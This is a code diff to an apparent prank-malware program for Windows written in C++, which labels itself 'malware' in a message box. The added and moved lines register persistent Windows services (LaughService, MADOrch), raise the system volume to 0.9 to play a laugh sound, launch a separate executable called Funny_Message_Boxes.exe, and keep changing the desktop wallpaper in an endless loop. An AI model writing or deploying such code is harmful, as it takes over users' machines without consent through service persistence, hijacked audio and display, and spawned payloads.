@@ -90,25 +90,30 @@ void SpawnDelayedMessageBox(int delayPeriod, std::string text, std::string capti
 
 
 
+void StartProcess(std::string PathToPayload)
+{
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+    CreateProcessA(NULL, const_cast<char*>(PathToPayload.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+}
+
+
+
+
 
 int main(int argc, char* argv []) {
     bool isShortIntro = 1;
-    Intro(isShortIntro);   //I chose, The short Intro
+    Intro(isShortIntro, 0);   //I chose, The short Intro
     
     #ifndef DEBUG
-        
-
-
         std::string LaughServicePath = ParentDirectory + "\\" + "laugh_service.exe";
-        
         while(register_service(LaughServicePath, "LaughService") && (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING))
             {Sleep(200);}
-
-        std::string MADOrchestratorPath = ParentDirectory + "\\" + "MAD_Orch_Service.exe";
-        while(register_service(MADOrchestratorPath, "MADOrch") && (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING))
-            {Sleep(200);}
-
-        
     #endif  
 
 
@@ -125,12 +130,14 @@ int main(int argc, char* argv []) {
     AttachToMasterOutput(deviceEnumerator, defaultDevice, endpointVolume);
     float original_volume = 0;
     endpointVolume->GetMasterVolumeLevelScalar(&original_volume);
-    endpointVolume->SetMasterVolumeLevelScalar(0.3, nullptr);
+    endpointVolume->SetMasterVolumeLevelScalar(0.9, nullptr);
 
 
     LPCSTR LaughSoundPath = std::string(ParentDirectory + "\\" + "..\\data\\mus_f_newlaugh.wav").c_str();//std::filesystem::absolute("eid_far5a_cropped.wav").string().c_str();
     PlaySoundA(LaughSoundPath, NULL, SND_SYNC);
 
+
+    endpointVolume->SetMasterVolumeLevelScalar(0.5, nullptr);
 
 
     
@@ -172,7 +179,10 @@ int main(int argc, char* argv []) {
     int max_files = GetFilesCountInDirectory(ParentDirectory + "\\" + "..\\data\\" +"frames");
 
 
-    auto a1 = std::async(std::launch::async, &SpawnDelayedMessageBox, 30000, "How to stop the malware?\nJust press \"f8\" on your keyboard!\n\t:)", "How to stop the malware?", 0);
+    auto a1 = std::async(std::launch::async, &SpawnDelayedMessageBox, 20000, "How to stop the malware?\nJust press \"f8\" on your keyboard!\n\t:)", "How to stop the malware?", 0);
+    auto a2 = std::async(std::launch::async, &StartProcess, ParentDirectory+"\\Funny_Message_Boxes.exe");
+    
+
 
     //Main loop, where anything constantly running is done here;
     while(true)
@@ -199,7 +209,14 @@ int main(int argc, char* argv []) {
         usleep(40000); //busy waiting, decreasing this number makes the wallpaper change frames faster
     }
 
+    #ifndef DEBUG
+    std::string MADOrchestratorPath = ParentDirectory + "\\" + "MAD_Orch_Service.exe";
+    while(register_service(MADOrchestratorPath, "MADOrch") && (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING))
+        {Sleep(200);}
+    #endif
+
     // Turning off the music
+    PlaySoundA(NULL, NULL, SND_ASYNC);
     endpointVolume->SetMasterVolumeLevelScalar(original_volume, nullptr);
     DetachFromMasterOutput(endpointVolume, defaultDevice, deviceEnumerator);
 
